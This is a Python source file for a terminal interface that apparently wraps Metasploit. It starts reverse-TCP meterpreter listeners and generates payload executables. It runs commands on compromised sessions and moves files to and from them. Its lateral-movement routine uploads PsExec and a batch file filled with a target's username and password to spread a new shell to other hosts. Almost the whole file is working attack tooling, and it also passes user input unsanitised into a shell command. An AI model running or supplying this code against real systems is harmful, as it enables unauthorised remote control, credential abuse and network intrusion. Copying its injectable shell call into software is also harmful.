import requests
import sys
import curses

from shutil import copyfile
import os
import time

from pymetasploit3.msfrpc import MsfRpcClient
from pymetasploit3.msfconsole import MsfRpcConsole

import jinja2
import pdfkit
import pandas as pd

import tools


class MetaConsole:

    def __init__(self, stdscr, menu_window, password, clientport=5000):
        # Curses Stuff (GUI)
        self.stdscr = stdscr
        self.menu_window = menu_window
        # newpad (Height, Width)
        self.full_height_out, self.full_width_out = stdscr.getmaxyx()
        self.output_window = curses.newpad(self.full_height_out * 100, self.full_width_out // 3 * 2)

        self.coordinate_dict = {'output_x': self.full_width_out // 3,
                                'output_y': 0,
                                'output_max_y': self.full_height_out * 100,
                                'menu_x': 0,
                                'menu_y': 0,
                                }

        # Console Status for what ever
        self.console_status = None
        self.data_frames = []
        self.df = {}
        self.df = pd.DataFrame(columns=['Command', 'Result'])

        # Try to open a Client Connection and catch any possible error
        try:
            self.client = MsfRpcClient(password, ssl=False, port=clientport)
            self.console = MsfRpcConsole(self.client, cb=self.read_console)

        except requests.exceptions.ConnectionError:
            self.output_window.clear()
            self.output_window.attron(curses.color_pair(2))
            self.output_window.addstr('Not possible to connect to Metasploit Client.\n')
            self.output_window.addstr('Please check if the RPCD Server is running!')
            self.output_window.attroff(curses.color_pair(2))
            self.update_output_window()
            self.output_window.getch()
            sys.exit()
        except ConnectionRefusedError:
            self.output_window.clear()
            self.output_window.attron(curses.color_pair(2))
            self.output_window.addstr('Connection to Metasploit Client was refused')
            self.output_window.attroff(curses.color_pair(2))
            self.update_output_window()
            self.output_window.getch()
            sys.exit()

    def scroll_output(self, scroll: int):
        if 0 <= self.coordinate_dict['output_y'] + scroll < self.coordinate_dict['output_max_y']:
            self.coordinate_dict['output_y'] += scroll
            self.update_output_window()

    def read_console(self, console_data):
        self.console_status = console_data['busy']

        if '[+]' in console_data['data']:
            sigdata = console_data['data'].rstrip().split('\n')
            for line in sigdata:
                if '[+]' in line:
                    self.output_window.addstr(line)
                    self.update_output_window()

    def start_listener(self, interface=None, port=None, platform=None):
        wrong_counter = 1
        self.menu_window.clear()
        self.menu_window.addstr(0, 0, 'Please Choose a Listening Interface (IP)')

        if not interface:
            interface = tools.IP_Chooser(self.menu_window)
        if not platform:
            platform = tools.platform_chooser(self.menu_window)
        if not port:
            free = False
            while not free:
                port = tools.port_input(self.menu_window)
                free = tools.check_port_free(interface['ipv4_address'], port)
                if free:
                    break
                self.output_window.addstr('Port used\n')
                self.update_output_window()

        self.print_result('Started Listener:', 'IP Address: ' + interface['ipv4_address'] + '; Port: ' + str(port))
        self.append_report('Started Listener', 'IP Address: ' + interface['ipv4_address'] + '; Port: ' + str(port))

        try:
            # exploit = self.client.modules.use('exploit', 'multi/handler')
            # exploit['ExitOnSession'] = False
            # exploit['LHOST'] = interface['ipv4_address']
            # exploit['LPORT'] = str(port)
            # job_id_listener = exploit.execute(payload='windows/meterpreter/reverse_tcp')

            self.console.execute('use exploit/multi/handler')
            if platform.lower() == 'x64':
                self.console.execute('set PAYLOAD windows/x64/meterpreter/reverse_tcp')
            elif platform.lower() == 'x86':
                self.console.execute('set PAYLOAD windows/meterpreter/reverse_tcp')
            self.console.execute('set ExitOnSession false')
            self.console.execute('set LHOST ' + interface['ipv4_address'])
            self.console.execute('set LPORT ' + str(port))
            # console.execute('show options')
            # gibt true oder false zurueck
            self.console.execute('exploit -j')

        except AttributeError:
            self.menu_window.addstr(wrong_counter + 2, 0, "Console is not yet initiated!")
            self.menu_window.getch()

    def get_listener(self):
        # self.console.execute('jobs')
        # pprint.pprint(self.client.jobs.list)
        # not working correct

        jobs = self.client.jobs.list

        if jobs:
            self.print_result('Listeners:', jobs, is_dict=True)
            self.append_report('Get Listeners', str(jobs))

        else:
            self.print_result('Listeners:', str('Listener not started'))
            self.append_report('Get Listeners', str('Listener not started'))

        self.update_output_window()

    def get_listener_details(self):
        listener_keys = self.client.jobs.list.keys()
        listener_id = None
        while True:
            try:
                _id = self.input_reader('ListenerID for Details (x to return)', 'ID')
                if _id.lower().rstrip('\n') == 'x':
                    listener_id = None
                    break

                listener_id = int(_id)
                if str(listener_id) in list(listener_keys):
                    break

                self.output_window.addstr(f'Please provide a number in {list(listener_keys)}')
                self.update_output_window()
            except ValueError:
                self.output_window.addstr('Please provide a number.')
                self.update_output_window()
                continue

        self.output_window.addstr('Listener details: \n')

        if listener_id:
            for key, value in self.client.jobs.info(listener_id).items():
                if isinstance(value, dict):
                    for key_2, value_2 in value.items():
                        self.output_window.addstr(f'\t{key_2}:\t {value_2}\n')
                else:
                    self.output_window.addstr(f'{key}:\t {value}\n')

            self.print_result('', str(''))
            self.update_output_window()

    def get_active_sessions(self):
        activeSessions = self.client.sessions.list

        # activeSessions = self.console.execute('sessions -l')
        out_string = ''

        for key in activeSessions.keys():
            info = activeSessions[str(key)]["info"]
            data = info.split("\\")
            computer = data[0]
            out_string = out_string + 'Session ID: ' + key + ' Computer: ' + computer + '\n'

        # self.output_window.addstr('Active Sessions: \n')
        if out_string == '':
            self.print_result('Active Sessions:', str('No Active Sessions'))
            self.append_report('Get Active Sessions:', str('No Active Sessions'))
        else:
            self.print_result('Active Sessions:', str(out_string))
            self.append_report('Get Active Sessions:', str(out_string))

        self.update_output_window()

    def get_active_session_detail(self, session_number):

        out_string = ''
        activeSessions = self.client.sessions.list

        for key in activeSessions.keys():
            if key == session_number.strip('\n'):
                tunnel_peer = activeSessions[str(key)]["tunnel_peer"]
                session_type = activeSessions[str(key)]["desc"]
                info = activeSessions[str(key)]["info"]
                data = info.split("\\")
                computer = data[0]
                out_string = 'Session ID: ' + key + ' Computer: ' + computer + '\ntunnel: ' + tunnel_peer + \
                             " Type: " + session_type
                out_string = out_string + '\n'

        self.menu_window.clear()
        self.output_window.addstr('Session detail: \n')
        self.output_window.addstr(str(out_string))

        self.update_output_window()

    def generate_shell(self, IP=None, port=None, path=None):

        if not IP:
            interface = tools.IP_Chooser(self.menu_window)
            IP = interface['ipv4_address']
            # IP = self.input_reader('Please enter the IP of the C&C Server', 'IP')
        if not port:
            port = self.input_reader('Please enter the Listening Port of the C&C Server', 'Port')
        if not path:
            path = self.input_reader('Please enter the Export-Path (e.g. /tmp/payload.exe)', 'Path')

        os.popen('scripts/createShell.sh ' + IP.strip('\n') + ' ' + port.strip('\n') + ' ' + path.strip(
                '\n') + ' 2> /dev/null')

        self.print_result('Result:', str('Export finish: ' + path))
        self.append_report('Create Shell:', '-')

    def terminate_listener(self, listenerID=None):
        if not listenerID:
            _id = self.input_reader('ListenerID to terminate (x to return)', 'ID')
            _listener_id = str(_id.rsplit('\n')[0])
            if _listener_id.lower() == 'x':
                pass
            elif _listener_id in list(self.client.jobs.list.keys()):
                self.output_window.addstr(f'Terminate Listener: {_listener_id}\n')
                self.update_output_window()
                self.client.jobs.stop(int(_listener_id))
            else:
                self.output_window.addstr(f'There is no Listener: {_listener_id}\n')
                self.update_output_window()

        self.append_report('Session term', str('Session Val: ' + str(listenerID)))

    def terminate_session(self, sessionID=None):
        if not sessionID:
            sessionID = self.input_reader('SessionID to terminate (x to return)', 'ID')

        if sessionID.lower() == 'x':
            pass
        else:
            shell = self.client.sessions.session(sessionID.strip('\n'))
            shell.write('exit')

    def terminate_all_sessions(self):
        for s in self.client.sessions.list.keys():
            self.terminate_session(s)
            # self.client.sessions.session(int(s)).kill()
        # self.console.execute('sessions -K')

    def execute_command(self, session_number, command, terminating_str=None):

        if not command:
            command = self.input_reader('Enter Command', 'Command')

        erg = None
        if not terminating_str:
            shell = self.client.sessions.session(session_number.strip('\n'))
            shell.write(command)

            while erg is None:
                time.sleep(10)
                erg = shell.read()
        else:
            erg = self.client.sessions.session(session_number.strip('\n')). \
                run_with_output(command, terminating_str).replace('0xe9', 'NonePrintableChar')

        if not erg:
            erg = 'No Result'

        self.print_result('Result:', str(erg.replace('\0', '\\0')))
        self.append_report(command, str(erg.replace('\0', '\\0')))

    def logout(self):
        # TODO This method is not working
        del self.console
        self.client.logout()

        sys.exit(0)

    def search(self, session_number, command, terminating_str=None):

        pattern = self.input_reader('Do not use Regex!\nPlease enter a File pattern', 'File Pattern')
        location = self.input_reader('Please enter a Search Location', 'Location')

        erg = self.client.sessions.session(session_number.strip('\n')).run_with_output(
                command + ' ' + pattern + ' ' + location, terminating_str)

        if not erg:
            erg = 'No Result'

        self.print_result('Result:', str(erg))
        self.append_report('Search:<br>Pattern: ' + pattern + '<br>Location: ' + location, erg)

    def upload(self, session_number, terminating_str):

        srcpath = self.input_reader('Please enter a source path', 'Source path')
        destpath = self.input_reader('Please enter a destination path', 'Dest path')

        erg = self.client.sessions.session(session_number.strip('\n')).run_with_output(
                'upload ' + srcpath + ' ' + destpath, terminating_str)

        if not erg:
            erg = 'No Result'

        self.print_result('Result:', str(erg))
        self.append_report('Upload:<br>SrcPath: ' + srcpath + '<br>DestPath: ' + destpath, erg)

    def download(self, session_number, terminating_str):

        srcpath = self.input_reader('Please enter a source path', 'Dest path')
        destpath = self.input_reader('Please enter a destination path', 'Dest path')

        erg = self.client.sessions.session(session_number.strip('\n')).run_with_output(
                'download ' + srcpath + ' ' + destpath, terminating_str)

        if not erg:
            erg = 'No Result'

        self.print_result('Result:', str(erg))
        self.append_report('Download:<br>SrcPath: ' + srcpath + '<br>DestPath: ' + destpath, erg)

    def exec_script_oServer(self, session_number):
        self.menu_window.clear()

        copyfile('binaries/PsExec64.exe', '/tmp/PsExec64.exe')

        srcpath = self.input_reader('Please enter a file path(Victim1)', 'source path')
        destpath = self.input_reader('Please enter a file path(Victim2)', 'dest path')
        target = self.input_reader('Please enter a Target', 'Target')
        user = self.input_reader('Enter a Username', 'User')
        pw = self.input_reader('Enter a Password', 'PW')

        fin = open('scripts/copy.bat.tmp', "rt")
        fout = open('/tmp/copy.bat', "wt")

        for line in fin:
            line = line.replace('{{TARGET}}', target.strip('\n'))
            line = line.replace('{{USER}}', user.strip('\n'))
            line = line.replace('{{PASSWORD}}', pw.strip('\n'))
            line = line.replace('{{DEST}}', destpath.strip('\n'))
            line = line.replace('{{SOURCE}}', srcpath.strip('\n'))
            fout.write(line)

        fin.close()
        fout.close()

        erg = self.client.sessions.session(session_number.strip('\n')).run_with_output(
                'upload /tmp/PsExec64.exe  PsExec64.exe', '100.0%')

        if not erg:
            erg = 'No Result'

        time.sleep(1)

        tmp = self.client.sessions.session(session_number.strip('\n')).run_with_output(
                'upload /tmp/copy.bat  copy.bat', '100.0%')

        if not tmp:
            tmp = 'No Result'

        time.sleep(1)
        self.execute_command(session_number.strip('\n'), 'execute -f copy.bat')

        self.print_result('Result:', str(erg + '\n' + tmp + '\n Shell started\n'))
        self.append_report('Exec Script other Server', str(erg + '\n' + tmp + '\n Shell started\n'))

    def lateral_move(self, session_number):
        self.menu_window.clear()

        copyfile('binaries/PsExec64.exe', '/tmp/PsExec64.exe')

        interface = tools.IP_Chooser(self.menu_window)

        port = 10000
        free = False
        while not free:
            free = tools.check_port_free(interface['ipv4_address'], port)
            if free:
                break
            port += 1

        started = True
        while started:

            self.start_listener(interface, port)
            time.sleep(5)
            started = tools.check_port_free(interface['ipv4_address'], port)

        self.output_window.addstr(str('Shell generation in Progress\n'))
        self.update_output_window()

        self.generate_shell(interface['ipv4_address'], str(port), '/tmp/shell' + str(port) + '.exe')

        time.sleep(10)
        self.output_window.addstr(str('Shell generated\n'))
        self.update_output_window()

        self.client.sessions.session(session_number.strip('\n')).run_with_output(
                'upload /tmp/shell' + str(port) + '.exe  shell' + str(port) + '.exe', '100.0%')

        target = self.input_reader('Please enter a Target', 'Target')
        user = self.input_reader('Enter a Username', 'User')
        pw = self.input_reader('Enter a Password', 'PW')

        fin = open('scripts/copy.bat.tmp', "rt")
        fout = open('/tmp/copy.bat', "wt")

        srcpath = 'shell' + str(port) + '.exe'
        destpath = 'shell' + str(port) + '.exe'

        for line in fin:
            line = line.replace('{{TARGET}}', target.strip('\n'))
            line = line.replace('{{USER}}', user.strip('\n'))
            line = line.replace('{{PASSWORD}}', pw.strip('\n'))
            line = line.replace('{{DEST}}', destpath.strip('\n'))
            line = line.replace('{{SOURCE}}', srcpath.strip('\n'))
            fout.write(line)

        fin.close()
        fout.close()

        erg = self.client.sessions.session(session_number.strip('\n')).run_with_output(
                'upload /tmp/PsExec64.exe  PsExec64.exe', '100.0%')

        if not erg:
            erg = 'No Result'

        time.sleep(1)

        tmp = self.client.sessions.session(session_number.strip('\n')).run_with_output(
                'upload /tmp/copy.bat  copy.bat', '100.0%')

        if not tmp:
            tmp = 'No Result'

        time.sleep(1)
        self.execute_command(session_number.strip('\n'), 'execute -f copy.bat')

        self.print_result('Result:', str(erg + '\n' + tmp + '\n Shell started\n'))
        self.append_report('Exec Script other Server', str(erg + '\n' + tmp + '\n Shell started\n'))

    def input_reader(self, header, line):

        self.menu_window.clear()
        self.menu_window.addstr(0, 0, header + '\n')

        while True:
            self.menu_window.addstr(line + ': ')
            self.menu_window.refresh()
            key_search = None
            msg = ''
            ch_count = 0
            curses.echo()
            while not (key_search == curses.KEY_ENTER or key_search in [10, 13]):
                key_search = self.menu_window.getch()
                if (key_search == curses.KEY_BACKSPACE or key_search == 127) and ch_count > 0:
                    for x in range(3):
                        key_search = self.menu_window.addstr('\b')
                        key_search = self.menu_window.delch()
                    msg = msg[:-1]
                    ch_count -= 1
                elif (key_search == curses.KEY_BACKSPACE or key_search == 127) and ch_count == 0:
                    for x in range(2):
                        key_search = self.menu_window.addstr('\b')
                        key_search = self.menu_window.delch()
                else:
                    msg = msg + str(chr(key_search))
                    ch_count += 1
            break
        return msg

    def help_scrolling(self):

        self.output_window.addstr('Scrolling: \n---------------\n')
        self.output_window.addstr(str('Scroll down press n(next)\nScroll up press p(previous)\n---------------\n'))
        self.update_output_window()

    def help_command(self):

        self.output_window.addstr('Execute Commands: \n---------------\n')
        self.output_window.addstr(str(
                'If you want to execute non meterpreter commands you have to write '
                '\'execute -f\' in front of the command.'
                '\nLike this:\n  execute -f <command>\n  execute -f net use\n---------------\n'))
        self.update_output_window()

    def print_result(self, type_print, erg, is_dict=False):
        self.output_window.addstr(str(type_print) + '\n---------------------\n\n')
        if is_dict:
            for key, value in erg.items():
                self.output_window.addstr(f'Listener {str(key)}: {value}\n')
        else:
            self.output_window.addstr(str(erg))
        self.output_window.addstr('\n\n================================\n\n')
        self.update_output_window()

    def update_output_window(self):
        """Refresh the Out Window"""

        self.output_window.refresh(self.coordinate_dict['output_y'], 0, 0,
                                   self.coordinate_dict['output_x'] + 1,
                                   self.full_height_out - 1,
                                   self.full_width_out - 1)

    def append_report(self, command, result):

        self.df = self.df.append({'Command': command, 'Result': str(result.replace('\n', '<br>'))}, ignore_index=True)
        self.data_frames.append({'df': self.df})

    def create_report(self):

        templateLoader = jinja2.FileSystemLoader(searchpath="report")
        templateEnv = jinja2.Environment(loader=templateLoader)
        TEMPLATE_FILE = "template.html"
        template = templateEnv.get_template(TEMPLATE_FILE)

        for d in self.data_frames:
            outputText = template.render(df=d['df'])
            html_file = open('report.html', 'w')
            html_file.write(outputText)
            html_file.close()

        pdfkit.from_file('report.html', 'report.pdf')
        self.print_result('Report Export:', './report.pdf')
